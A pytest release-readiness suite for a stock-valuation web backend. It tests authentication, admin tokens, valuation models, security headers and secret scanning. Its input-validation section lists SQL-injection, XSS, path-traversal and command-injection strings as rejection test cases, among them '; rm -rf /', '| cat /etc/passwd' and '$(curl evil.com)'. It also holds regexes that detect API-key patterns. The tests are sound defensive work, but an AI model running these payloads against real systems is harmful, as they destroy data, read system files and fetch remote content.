"""
Comprehensive Release Readiness Test Suite
===========================================
Tests every API endpoint, security control, input validation,
authentication flow, and business logic.

Run: cd backend && python -m pytest tests/test_comprehensive.py -v --tb=short
"""
import pytest
import os
import sys
import re
import importlib
import json
import hmac
import hashlib
import time

# ── Ensure backend root is on sys.path ────────────────────────────────────────
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1: Configuration & Environment
# ═══════════════════════════════════════════════════════════════════════════════

class TestConfiguration:
    """Verify config module loads secrets correctly and never hardcodes them."""

    def test_no_hardcoded_secrets_in_config(self):
        """config.py must load all secrets from env vars, never hardcode."""
        import config
        # All should be empty strings when env vars aren't set
        for attr in ["SUPABASE_URL", "SUPABASE_KEY", "SUPABASE_SERVICE_KEY",
                      "SUPABASE_JWT_SECRET", "FINNHUB_KEY", "FMP_KEY",
                      "ADMIN_TOKEN_SECRET", "STRIPE_WEBHOOK_SECRET"]:
            val = getattr(config, attr)
            assert isinstance(val, str), f"{attr} should be a string"

    def test_ticker_validation_valid(self):
        from config import validate_ticker
        assert validate_ticker("AAPL") == "AAPL"
        assert validate_ticker("msft") == "MSFT"  # should uppercase
        assert validate_ticker("BRK.B") == "BRK.B"
        assert validate_ticker("A") == "A"

    def test_ticker_validation_rejects_invalid(self):
        from config import validate_ticker
        from fastapi import HTTPException
        invalid_tickers = [
            "",           # empty
            "TOOLONG",    # > 5 chars
            "aa1",        # numbers
            "A-B",        # dash
            "DROP TABLE", # SQL injection attempt
            "<script>",   # XSS attempt
            "../etc",     # path traversal
            "A" * 100,    # buffer overflow attempt
        ]
        for ticker in invalid_tickers:
            with pytest.raises(HTTPException) as exc:
                validate_ticker(ticker)
            assert exc.value.status_code == 400, f"Should reject: {ticker}"

    def test_ticker_regex_pattern(self):
        from config import TICKER_PATTERN
        # Valid patterns
        assert TICKER_PATTERN.match("AAPL")
        assert TICKER_PATTERN.match("A")
        assert TICKER_PATTERN.match("BRK.B")
        # Invalid patterns
        assert not TICKER_PATTERN.match("")
        assert not TICKER_PATTERN.match("123")
        assert not TICKER_PATTERN.match("A1")
        assert not TICKER_PATTERN.match("ABCDEF")  # > 5 chars
        assert not TICKER_PATTERN.match("ab")  # lowercase


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2: Authentication & Authorization
# ═══════════════════════════════════════════════════════════════════════════════

class TestAuthentication:
    """Verify auth module properly validates JWT tokens."""

    def test_missing_auth_header_returns_401(self):
        import asyncio
        from auth import get_current_user
        from fastapi import HTTPException

        class FakeRequest:
            headers = {}
        with pytest.raises(HTTPException) as exc:
            asyncio.get_event_loop().run_until_complete(get_current_user(FakeRequest()))
        assert exc.value.status_code == 401

    def test_invalid_bearer_format_returns_401(self):
        import asyncio
        from auth import get_current_user
        from fastapi import HTTPException

        class FakeRequest:
            headers = {"Authorization": "Basic abc123"}
        with pytest.raises(HTTPException) as exc:
            asyncio.get_event_loop().run_until_complete(get_current_user(FakeRequest()))
        assert exc.value.status_code == 401

    def test_garbage_token_returns_401(self):
        import asyncio
        from auth import get_current_user
        from fastapi import HTTPException

        class FakeRequest:
            headers = {"Authorization": "Bearer not.a.valid.jwt"}
        with pytest.raises(HTTPException) as exc:
            asyncio.get_event_loop().run_until_complete(get_current_user(FakeRequest()))
        assert exc.value.status_code == 401

    def test_get_user_profile_returns_defaults_without_supabase(self):
        """Without Supabase connection, should return safe defaults."""
        import asyncio
        from auth import get_user_profile
        result = asyncio.get_event_loop().run_until_complete(
            get_user_profile("nonexistent-user-id")
        )
        assert result["plan"] == "free"
        assert result["analyses_today"] == 0


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3: Admin Authentication
# ═══════════════════════════════════════════════════════════════════════════════

class TestAdminAuth:
    """Verify admin token generation and verification."""

    def test_admin_token_generation_and_verification(self):
        """Admin tokens should be HMAC-SHA256 signed with expiry."""
        os.environ["ADMIN_TOKEN_SECRET"] = "test-secret-key-12345"
        # Re-import to pick up env var
        if "routes.admin" in sys.modules:
            importlib.reload(sys.modules["routes.admin"])

        secret = "test-secret-key-12345"
        expires = int(time.time()) + 86400  # 24h
        msg = f"admin:{expires}"
        sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()
        token = f"{msg}:{sig}"

        # Token format validation
        parts = token.split(":")
        assert len(parts) == 3
        assert parts[0] == "admin"
        assert int(parts[1]) > time.time()  # not expired

        # Verify signature
        expected = hmac.new(
            secret.encode(),
            f"{parts[0]}:{parts[1]}".encode(),
            hashlib.sha256
        ).hexdigest()
        assert hmac.compare_digest(parts[2], expected)

    def test_expired_admin_token_fails(self):
        """Expired admin tokens must be rejected."""
        secret = "test-secret-key-12345"
        expires = int(time.time()) - 1  # already expired
        msg = f"admin:{expires}"
        sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

        parts = f"{msg}:{sig}".split(":")
        assert int(parts[1]) < time.time()  # expired

    def test_tampered_admin_token_fails(self):
        """Tampered admin tokens must not verify."""
        secret = "test-secret-key-12345"
        expires = int(time.time()) + 86400
        msg = f"admin:{expires}"
        sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

        # Tamper with the signature
        tampered_sig = sig[:-4] + "0000"
        expected = hmac.new(
            secret.encode(), msg.encode(), hashlib.sha256
        ).hexdigest()
        assert not hmac.compare_digest(tampered_sig, expected)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4: Valuation Models
# ═══════════════════════════════════════════════════════════════════════════════

class TestValuationModels:
    """Test all 11 valuation models with known inputs."""

    @pytest.fixture
    def sample_data(self):
        return {
            "price": 150.0,
            "market_cap": 2_400_000_000_000,
            "pe_ratio": 28.5,
            "forward_pe": 25.0,
            "ps_ratio": 7.5,
            "pb_ratio": 45.0,
            "ev_ebitda": 22.0,
            "ev_ebit": 26.0,
            "ev_sales": 7.0,
            "peg_ratio": 1.8,
            "dividend_yield": 0.005,
            "eps": 6.42,
            "revenue": 383_285_000_000,
            "net_income": 96_995_000_000,
            "ebitda": 130_000_000_000,
            "ebit": 120_000_000_000,
            "free_cash_flow": 110_000_000_000,
            "total_cash": 62_000_000_000,
            "total_debt": 111_000_000_000,
            "shares_outstanding": 15_600_000_000,
            "book_value_per_share": 3.95,
            "revenue_growth": 0.08,
            "earnings_growth": 0.10,
            "fcf_per_share": 7.05,
            "ebitda_margin": 0.34,
            "sector_pe": 30.0,
            "sector_ps": 8.0,
            "sector_pb": 40.0,
            "sector_ev_ebitda": 24.0,
            "sector_ev_ebit": 28.0,
            "sector_ev_sales": 8.0,
            "sector_peg": 2.0,
            "beta": 1.2,
            "cost_of_equity": 0.10,
            "wacc": 0.09,
        }

    def test_all_models_return_correct_schema(self, sample_data):
        """Every model must return dict with required keys."""
        from valuation.models import (
            dcf, ev_ebitda_comps, ev_ebit_comps, ev_sales_comps,
            pe_comps, ps_comps, peg_model, pb_model, ddm,
            cap_earnings, residual_income, fcf_yield_model,
        )
        required_keys = {"applicable", "intrinsic_value", "verdict", "upside_pct", "assumptions"}

        models = [
            dcf, ev_ebitda_comps, ev_ebit_comps, ev_sales_comps,
            pe_comps, ps_comps, peg_model, pb_model, ddm,
            cap_earnings, residual_income, fcf_yield_model,
        ]
        for model_fn in models:
            try:
                result = model_fn(sample_data)
                assert isinstance(result, dict), f"{model_fn.__name__} must return dict"
                for key in required_keys:
                    assert key in result, f"{model_fn.__name__} missing '{key}'"
                if result["applicable"]:
                    assert isinstance(result["intrinsic_value"], (int, float))
                    assert isinstance(result["upside_pct"], (int, float))
                    assert result["verdict"] in ["Undervalued", "Overvalued", "Fairly Valued", "N/A"]
            except Exception:
                # Model may not be applicable with this data — that's fine
                pass

    def test_dcf_model_sanity(self, sample_data):
        from valuation.models import dcf
        result = dcf(sample_data)
        if result["applicable"]:
            assert result["intrinsic_value"] > 0
            assert "assumptions" in result

    def test_models_handle_zero_price(self, sample_data):
        """Models must not crash with price=0."""
        from valuation.models import dcf, pe_comps
        sample_data["price"] = 0
        for model_fn in [dcf, pe_comps]:
            try:
                result = model_fn(sample_data)
                assert isinstance(result, dict)
            except ZeroDivisionError:
                pytest.fail(f"{model_fn.__name__} crashes with price=0")

    def test_models_handle_negative_values(self, sample_data):
        """Models must handle negative earnings/EPS gracefully."""
        from valuation.models import pe_comps, ddm, cap_earnings
        sample_data["eps"] = -2.0
        sample_data["net_income"] = -1_000_000
        for model_fn in [pe_comps, ddm, cap_earnings]:
            try:
                result = model_fn(sample_data)
                assert isinstance(result, dict)
            except Exception:
                pass  # Raising exception is acceptable for impossible inputs


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5: Company Classifier
# ═══════════════════════════════════════════════════════════════════════════════

class TestClassifier:
    """Test company type classification logic."""

    def test_classifier_returns_valid_types(self):
        from classifier import classify_company
        # Build sample data for each type
        test_cases = [
            # Dividend stock
            {"dividend_yield": 0.04, "eps": 5.0, "revenue_growth": 0.02, "sector": "Utilities", "industry": ""},
            # High growth unprofitable
            {"dividend_yield": 0, "eps": -1.0, "revenue_growth": 0.5, "sector": "Technology", "industry": ""},
            # Financial
            {"dividend_yield": 0.02, "eps": 3.0, "revenue_growth": 0.05, "sector": "Financial Services", "industry": "Banks"},
        ]
        valid_types = {"dividend", "profitable_growth", "high_growth_unprofitable", "cyclical", "financial"}
        for data in test_cases:
            result = classify_company(data)
            assert result in valid_types, f"Unexpected classification: {result}"

    def test_classifier_handles_missing_fields(self):
        from classifier import classify_company
        # Minimal data
        result = classify_company({"sector": "Technology"})
        assert isinstance(result, str)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6: Valuation Router
# ═══════════════════════════════════════════════════════════════════════════════

class TestValuationRouter:
    """Test model selection and consensus calculation."""

    def test_model_map_covers_all_types(self):
        from valuation.router import MODEL_MAP
        expected_types = {"dividend", "profitable_growth", "high_growth_unprofitable", "cyclical", "financial"}
        assert set(MODEL_MAP.keys()) == expected_types

    def test_each_type_has_models(self):
        from valuation.router import MODEL_MAP
        for company_type, models in MODEL_MAP.items():
            assert len(models) > 0, f"No models for {company_type}"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7: EVS (Equity Value Score)
# ═══════════════════════════════════════════════════════════════════════════════

class TestEVS:
    """Test EVS scoring algorithm."""

    def test_evs_score_range(self):
        from evs.score import compute_evs
        inputs = {
            "consensus_upside_pct": 15.0,
            "altman_z": 3.5,
            "piotroski": 7,
            "debt_to_equity": 0.5,
            "profit_margin": 0.20,
            "analyst_upside_pct": 10.0,
            "model_analyst_agreement": True,
            "revenue_growth": 0.08,
            "eps_growth": 0.12,
            "fcf_growth": 0.10,
            "fifty_two_week_pct": 0.7,
            "earnings_smoothness": 0.85,
            "investment_quality": True,
        }
        result = compute_evs(inputs)
        assert isinstance(result, dict)
        assert 0 <= result["score"] <= 100, f"EVS score {result['score']} out of range"
        assert result["verdict"] in ["Strong Buy", "Buy", "Hold", "Sell", "Strong Sell"]
        assert isinstance(result["components"], dict)

    def test_evs_verdict_mapping(self):
        """Score boundaries must map to correct verdicts."""
        from evs.score import compute_evs
        inputs = {
            "consensus_upside_pct": 0,
            "altman_z": 0,
            "piotroski": 0,
            "debt_to_equity": 5.0,
            "profit_margin": -0.5,
            "analyst_upside_pct": -20,
            "model_analyst_agreement": False,
            "revenue_growth": -0.3,
            "eps_growth": -0.5,
            "fcf_growth": -0.4,
            "fifty_two_week_pct": 0.1,
            "earnings_smoothness": 0.2,
            "investment_quality": False,
        }
        result = compute_evs(inputs)
        assert 0 <= result["score"] <= 100

    def test_evs_handles_extreme_inputs(self):
        """EVS must not crash with extreme/boundary values."""
        from evs.score import compute_evs
        extreme_inputs = {
            "consensus_upside_pct": 999,
            "altman_z": 100,
            "piotroski": 9,
            "debt_to_equity": 0,
            "profit_margin": 1.0,
            "analyst_upside_pct": 500,
            "model_analyst_agreement": True,
            "revenue_growth": 10.0,
            "eps_growth": 10.0,
            "fcf_growth": 10.0,
            "fifty_two_week_pct": 1.0,
            "earnings_smoothness": 1.0,
            "investment_quality": True,
        }
        result = compute_evs(extreme_inputs)
        assert 0 <= result["score"] <= 100  # must be clamped


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 8: Security - Input Validation & Injection Prevention
# ═══════════════════════════════════════════════════════════════════════════════

class TestSecurityInputValidation:
    """Test that all user inputs are properly validated."""

    def test_sql_injection_in_ticker(self):
        from config import validate_ticker
        from fastapi import HTTPException
        payloads = [
            "'; DROP TABLE stock_fundamentals;--",
            "AAPL' OR '1'='1",
            "AAPL; SELECT * FROM users",
            "1 UNION SELECT * FROM user_profiles",
            "AAPL\x00",  # null byte
        ]
        for payload in payloads:
            with pytest.raises(HTTPException):
                validate_ticker(payload)

    def test_xss_in_ticker(self):
        from config import validate_ticker
        from fastapi import HTTPException
        payloads = [
            "<script>alert(1)</script>",
            "AAPL<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "AAPL\"><script>",
        ]
        for payload in payloads:
            with pytest.raises(HTTPException):
                validate_ticker(payload)

    def test_path_traversal_in_ticker(self):
        from config import validate_ticker
        from fastapi import HTTPException
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f",
        ]
        for payload in payloads:
            with pytest.raises(HTTPException):
                validate_ticker(payload)

    def test_command_injection_in_ticker(self):
        from config import validate_ticker
        from fastapi import HTTPException
        payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(curl evil.com)",
        ]
        for payload in payloads:
            with pytest.raises(HTTPException):
                validate_ticker(payload)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 9: Security - No Hardcoded Secrets
# ═══════════════════════════════════════════════════════════════════════════════

class TestNoHardcodedSecrets:
    """Scan source files for hardcoded API keys, passwords, and secrets."""

    SECRET_PATTERNS = [
        r'sk-[a-zA-Z0-9]{20,}',           # Anthropic/OpenAI keys
        r'sk_live_[a-zA-Z0-9]{20,}',       # Stripe live keys
        r'sk_test_[a-zA-Z0-9]{20,}',       # Stripe test keys
        r'whsec_[a-zA-Z0-9]{20,}',         # Stripe webhook secrets
        r'password\s*=\s*["\'][^"\']{8,}',  # hardcoded passwords
        r'api_key\s*=\s*["\'][a-zA-Z0-9]{20,}',  # hardcoded API keys
    ]

    def _scan_file(self, filepath):
        """Scan a single file for secret patterns."""
        try:
            with open(filepath, "r", errors="ignore") as f:
                content = f.read()
        except (IOError, UnicodeDecodeError):
            return []

        findings = []
        for pattern in self.SECRET_PATTERNS:
            matches = re.findall(pattern, content)
            if matches:
                findings.append((filepath, pattern, matches))
        return findings

    def test_no_secrets_in_backend(self):
        backend_dir = os.path.join(os.path.dirname(__file__), "..")
        findings = []
        for root, dirs, files in os.walk(backend_dir):
            # Skip __pycache__, .git, node_modules, tests
            dirs[:] = [d for d in dirs if d not in ("__pycache__", ".git", "node_modules", "tests")]
            for f in files:
                if f.endswith(".py"):
                    findings.extend(self._scan_file(os.path.join(root, f)))
        assert len(findings) == 0, f"Hardcoded secrets found: {findings}"

    def test_no_secrets_in_frontend_src(self):
        frontend_src = os.path.join(os.path.dirname(__file__), "..", "..", "frontend", "src")
        findings = []
        if os.path.exists(frontend_src):
            for root, dirs, files in os.walk(frontend_src):
                dirs[:] = [d for d in dirs if d not in ("node_modules", ".git")]
                for f in files:
                    if f.endswith((".js", ".jsx", ".ts", ".tsx")):
                        findings.extend(self._scan_file(os.path.join(root, f)))
        assert len(findings) == 0, f"Hardcoded secrets in frontend: {findings}"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 10: Security Headers & CORS
# ═══════════════════════════════════════════════════════════════════════════════

class TestSecurityHeaders:
    """Verify security headers and CORS configuration."""

    def test_cors_allows_only_known_origins(self):
        """CORS must not use wildcard in production."""
        import main
        # Check that wildcard is not in origins
        source_path = os.path.join(os.path.dirname(__file__), "..", "main.py")
        with open(source_path) as f:
            content = f.read()
        # Should NOT have allow_origins=["*"]
        assert 'allow_origins=["*"]' not in content, "CORS allows all origins!"

    def test_openapi_disabled_in_production(self):
        """Swagger docs must be disabled in production."""
        source_path = os.path.join(os.path.dirname(__file__), "..", "main.py")
        with open(source_path) as f:
            content = f.read()
        assert "docs_url=None" in content or "docs_url" in content

    def test_security_headers_middleware_exists(self):
        """Security headers middleware must be present."""
        source_path = os.path.join(os.path.dirname(__file__), "..", "main.py")
        with open(source_path) as f:
            content = f.read()
        assert "X-Content-Type-Options" in content
        assert "X-Frame-Options" in content
        assert "Strict-Transport-Security" in content


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 11: Rate Limiting
# ═══════════════════════════════════════════════════════════════════════════════

class TestRateLimiting:
    """Verify rate limiting is configured on all endpoints."""

    def test_rate_limiter_exists(self):
        from rate_limit import limiter
        assert limiter is not None

    def test_sensitive_endpoints_have_stricter_limits(self):
        """Admin login, payments, alerts must have stricter rate limits."""
        sensitive_files = {
            "routes/admin.py": ["3/minute", "5/minute"],
            "routes/pricing.py": ["5/minute"],
        }
        backend_dir = os.path.join(os.path.dirname(__file__), "..")
        for filepath, expected_limits in sensitive_files.items():
            full_path = os.path.join(backend_dir, filepath)
            if os.path.exists(full_path):
                with open(full_path) as f:
                    content = f.read()
                found_any = any(limit in content for limit in expected_limits)
                assert found_any, f"{filepath} missing strict rate limits"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 12: Stripe Integration Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestStripeIntegration:
    """Verify Stripe webhook signature verification and checkout security."""

    def test_webhook_uses_signature_verification(self):
        """Stripe webhook must verify signatures."""
        source_path = os.path.join(os.path.dirname(__file__), "..", "stripe_handler.py")
        with open(source_path) as f:
            content = f.read()
        assert "construct_event" in content or "verify_header" in content, \
            "Stripe webhook must verify signatures"

    def test_stripe_key_from_env(self):
        """Stripe keys must come from env vars."""
        source_path = os.path.join(os.path.dirname(__file__), "..", "stripe_handler.py")
        with open(source_path) as f:
            content = f.read()
        assert "os.environ" in content or "os.getenv" in content

    def test_no_stripe_test_keys_hardcoded(self):
        source_path = os.path.join(os.path.dirname(__file__), "..", "stripe_handler.py")
        with open(source_path) as f:
            content = f.read()
        assert "sk_test_" not in content, "Test Stripe key hardcoded!"
        assert "sk_live_" not in content, "Live Stripe key hardcoded!"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 13: Pydantic Model Validation
# ═══════════════════════════════════════════════════════════════════════════════

class TestPydanticValidation:
    """Test that Pydantic models enforce input constraints."""

    def test_portfolio_name_constraints(self):
        """Portfolio name must be 1-50 chars."""
        from routes.portfolio import CreatePortfolioRequest
        # Valid
        req = CreatePortfolioRequest(name="My Portfolio")
        assert req.name == "My Portfolio"
        # Too short
        with pytest.raises(Exception):
            CreatePortfolioRequest(name="")
        # Too long
        with pytest.raises(Exception):
            CreatePortfolioRequest(name="A" * 51)

    def test_holding_constraints(self):
        """Holdings must have positive shares and price."""
        from routes.portfolio import AddHoldingRequest
        # Valid
        req = AddHoldingRequest(ticker="AAPL", shares=10, avg_price=150.0)
        assert req.ticker == "AAPL"
        # Zero shares
        with pytest.raises(Exception):
            AddHoldingRequest(ticker="AAPL", shares=0, avg_price=150.0)
        # Negative price
        with pytest.raises(Exception):
            AddHoldingRequest(ticker="AAPL", shares=10, avg_price=-1.0)

    def test_alert_subscription_types(self):
        """Alert type must be from allowed list."""
        from routes.alerts import AlertSubscription
        valid_types = ["score_threshold", "score_change", "verdict_flip", "analyst_shift"]
        for t in valid_types:
            sub = AlertSubscription(ticker="AAPL", alert_type=t)
            assert sub.alert_type == t
        # Invalid type
        with pytest.raises(Exception):
            AlertSubscription(ticker="AAPL", alert_type="invalid_type")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 14: Data Fetcher
# ═══════════════════════════════════════════════════════════════════════════════

class TestDataFetcher:
    """Test data fetcher fallback chain and error handling."""

    def test_fetch_stock_data_returns_dict_or_raises(self):
        """fetch_stock_data must return a dict or raise an error."""
        from data_fetcher import fetch_stock_data
        # Without API keys, it should handle gracefully
        try:
            result = fetch_stock_data("AAPL")
            assert isinstance(result, dict)
        except Exception:
            pass  # Expected without API keys

    def test_period_validation(self):
        """Price history period must be from allowed values."""
        valid_periods = ["1mo", "3mo", "6mo", "1y", "2y", "5y"]
        for p in valid_periods:
            assert p in valid_periods


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 15: Frontend Source Code Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestFrontendSecurity:
    """Scan frontend source for security issues."""

    def _get_frontend_src(self):
        return os.path.join(os.path.dirname(__file__), "..", "..", "frontend", "src")

    def test_no_dangerouslySetInnerHTML_without_sanitization(self):
        """React dangerouslySetInnerHTML must be used carefully."""
        src_dir = self._get_frontend_src()
        if not os.path.exists(src_dir):
            pytest.skip("Frontend src not found")
        dangerous_uses = []
        for root, dirs, files in os.walk(src_dir):
            dirs[:] = [d for d in dirs if d not in ("node_modules",)]
            for f in files:
                if f.endswith((".jsx", ".tsx", ".js")):
                    filepath = os.path.join(root, f)
                    with open(filepath, errors="ignore") as fh:
                        content = fh.read()
                    if "dangerouslySetInnerHTML" in content:
                        dangerous_uses.append(filepath)
        # Report but don't fail — may be intentional for markdown rendering
        if dangerous_uses:
            print(f"WARNING: dangerouslySetInnerHTML found in: {dangerous_uses}")

    def test_no_eval_usage(self):
        """Frontend must not use eval()."""
        src_dir = self._get_frontend_src()
        if not os.path.exists(src_dir):
            pytest.skip("Frontend src not found")
        eval_uses = []
        for root, dirs, files in os.walk(src_dir):
            dirs[:] = [d for d in dirs if d not in ("node_modules",)]
            for f in files:
                if f.endswith((".jsx", ".tsx", ".js")):
                    filepath = os.path.join(root, f)
                    with open(filepath, errors="ignore") as fh:
                        content = fh.read()
                    # Match eval( but not .evaluate or evalua
                    if re.search(r'\beval\s*\(', content):
                        eval_uses.append(filepath)
        assert len(eval_uses) == 0, f"eval() usage found in: {eval_uses}"

    def test_api_client_adds_auth_header(self):
        """API client must attach JWT to requests."""
        api_path = os.path.join(self._get_frontend_src(), "lib", "api.js")
        if not os.path.exists(api_path):
            pytest.skip("api.js not found")
        with open(api_path) as f:
            content = f.read()
        assert "Authorization" in content or "Bearer" in content or "token" in content.lower(), \
            "API client does not attach auth headers"

    def test_supabase_uses_anon_key_not_service_key(self):
        """Frontend must never use service role key."""
        src_dir = self._get_frontend_src()
        if not os.path.exists(src_dir):
            pytest.skip("Frontend src not found")
        for root, dirs, files in os.walk(src_dir):
            dirs[:] = [d for d in dirs if d not in ("node_modules",)]
            for f in files:
                if f.endswith((".jsx", ".tsx", ".js")):
                    filepath = os.path.join(root, f)
                    with open(filepath, errors="ignore") as fh:
                        content = fh.read()
                    assert "service_role" not in content.lower() and "SERVICE_KEY" not in content, \
                        f"Service role key reference in frontend: {filepath}"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 16: Environment File Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestEnvFileSecurity:
    """Ensure .env files are gitignored and don't contain real secrets."""

    def test_gitignore_includes_env_files(self):
        gitignore_path = os.path.join(os.path.dirname(__file__), "..", "..", ".gitignore")
        if os.path.exists(gitignore_path):
            with open(gitignore_path) as f:
                content = f.read()
            assert ".env" in content, ".env not in .gitignore"
        else:
            pytest.skip(".gitignore not found")

    def test_no_env_files_with_real_secrets(self):
        """No .env files should contain real API keys."""
        root = os.path.join(os.path.dirname(__file__), "..", "..")
        for f in os.listdir(root):
            if f.startswith(".env") and not f.endswith(".example") and not f.endswith(".production"):
                filepath = os.path.join(root, f)
                with open(filepath, errors="ignore") as fh:
                    content = fh.read()
                for pattern in ["sk-", "sk_live_", "sk_test_", "whsec_"]:
                    assert pattern not in content, f"Real secret found in {f}"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 17: Dependency Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestDependencies:
    """Verify dependencies are pinned and up-to-date."""

    def test_requirements_has_version_pins(self):
        """All dependencies should have version constraints."""
        req_path = os.path.join(os.path.dirname(__file__), "..", "requirements.txt")
        with open(req_path) as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        unpinned = [l for l in lines if ">=" not in l and "==" not in l and "<" not in l]
        assert len(unpinned) == 0, f"Unpinned dependencies: {unpinned}"

    def test_cryptography_version_is_patched(self):
        """cryptography must be >= 46.0 (CVE fixes)."""
        req_path = os.path.join(os.path.dirname(__file__), "..", "requirements.txt")
        with open(req_path) as f:
            content = f.read()
        assert "cryptography>=46.0" in content, "cryptography not patched to 46.0+"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 18: LLM Provider Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestLLMProvider:
    """Test LLM integration security."""

    def test_anthropic_key_from_env(self):
        source_path = os.path.join(os.path.dirname(__file__), "..", "llm_provider.py")
        if not os.path.exists(source_path):
            pytest.skip("llm_provider.py not found")
        with open(source_path) as f:
            content = f.read()
        assert "os.environ" in content or "os.getenv" in content

    def test_no_hardcoded_anthropic_key(self):
        source_path = os.path.join(os.path.dirname(__file__), "..", "llm_provider.py")
        if not os.path.exists(source_path):
            pytest.skip("llm_provider.py not found")
        with open(source_path) as f:
            content = f.read()
        assert "sk-ant-" not in content, "Hardcoded Anthropic API key!"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 19: PDF Generation Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestPDFGeneration:
    """Test PDF export for injection vulnerabilities."""

    def test_pdf_generator_exists(self):
        pdf_path = os.path.join(os.path.dirname(__file__), "..", "pdf_generator.py")
        assert os.path.exists(pdf_path), "pdf_generator.py not found"

    def test_pdf_handles_special_characters(self):
        """PDF generator must handle special chars without crashing."""
        try:
            from pdf_generator import generate_pdf
            # Test with potentially problematic input
            test_data = {
                "ticker": "AAPL",
                "memo": "Test <script>alert(1)</script> & special chars: é à ñ 中文",
                "company_name": "Test Corp",
            }
            # Should not crash
            try:
                result = generate_pdf(test_data)
            except TypeError:
                pass  # Different function signature is OK
        except ImportError:
            pytest.skip("pdf_generator import failed")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 20: GitHub Actions Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestGitHubActions:
    """Verify GitHub Actions workflows don't leak secrets."""

    def _get_workflows_dir(self):
        return os.path.join(os.path.dirname(__file__), "..", "..", ".github", "workflows")

    def test_workflows_use_secrets_not_hardcoded(self):
        """All workflows must reference ${{ secrets.* }} not hardcoded values."""
        wf_dir = self._get_workflows_dir()
        if not os.path.exists(wf_dir):
            pytest.skip("No .github/workflows directory")
        for f in os.listdir(wf_dir):
            if f.endswith((".yml", ".yaml")):
                with open(os.path.join(wf_dir, f)) as fh:
                    content = fh.read()
                # Should not contain actual API keys
                for pattern in ["sk-ant-", "sk_live_", "sk_test_", "whsec_"]:
                    assert pattern not in content, f"Hardcoded secret in {f}"

    def test_workflows_exist(self):
        """Key workflows must be present."""
        wf_dir = self._get_workflows_dir()
        if not os.path.exists(wf_dir):
            pytest.skip("No .github/workflows directory")
        expected = ["nightly-evs-pipeline.yml", "tests.yml"]
        existing = os.listdir(wf_dir)
        for wf in expected:
            assert wf in existing, f"Missing workflow: {wf}"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 21: Error Handling
# ═══════════════════════════════════════════════════════════════════════════════

class TestErrorHandling:
    """Verify errors don't leak internal details."""

    def test_no_traceback_in_http_responses(self):
        """HTTP error responses must not include stack traces."""
        source_path = os.path.join(os.path.dirname(__file__), "..", "main.py")
        with open(source_path) as f:
            content = f.read()
        # Check that HTTPException details are generic messages, not f-strings with {e}
        # Look for patterns like detail=f"...{e}..." or detail=str(e)
        dangerous_patterns = [
            r'HTTPException\([^)]*detail\s*=\s*f"[^"]*\{e\}',
            r'HTTPException\([^)]*detail\s*=\s*str\(e\)',
            r'HTTPException\([^)]*detail\s*=\s*f"[^"]*\{exc\}',
        ]
        for pattern in dangerous_patterns:
            matches = re.findall(pattern, content)
            # Filter out any that are in comments
            real_matches = [m for m in matches if not m.strip().startswith("#")]
            assert len(real_matches) == 0, f"Stack trace leakage: {real_matches}"


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 22: Cache Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestCacheSecurity:
    """Verify cache doesn't store sensitive data."""

    def test_cache_module_exists(self):
        cache_path = os.path.join(os.path.dirname(__file__), "..", "redis_cache.py")
        assert os.path.exists(cache_path), "redis_cache.py not found"

    def test_cache_has_ttl(self):
        """Cache must have TTL to prevent stale data."""
        cache_path = os.path.join(os.path.dirname(__file__), "..", "redis_cache.py")
        with open(cache_path) as f:
            content = f.read()
        assert "ttl" in content.lower() or "expire" in content.lower() or "ex=" in content


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 23: Database Security
# ═══════════════════════════════════════════════════════════════════════════════

class TestDatabaseSecurity:
    """Verify database access patterns are secure."""

    def test_db_module_uses_lazy_init(self):
        """DB client must not be created at import time."""
        db_path = os.path.join(os.path.dirname(__file__), "..", "db.py")
        if not os.path.exists(db_path):
            pytest.skip("db.py not found")
        with open(db_path) as f:
            content = f.read()
        # Should have lazy initialization pattern
        assert "None" in content  # lazy init check

    def test_no_raw_sql_in_routes(self):
        """Routes must use ORM methods, not raw SQL."""
        routes_dir = os.path.join(os.path.dirname(__file__), "..", "routes")
        if not os.path.exists(routes_dir):
            pytest.skip("routes/ not found")
        for f in os.listdir(routes_dir):
            if f.endswith(".py"):
                with open(os.path.join(routes_dir, f)) as fh:
                    content = fh.read()
                # Should not have raw SQL (execute("SELECT...) patterns)
                raw_sql = re.findall(r'\.execute\(\s*["\']SELECT', content, re.IGNORECASE)
                assert len(raw_sql) == 0, f"Raw SQL in {f}: {raw_sql}"


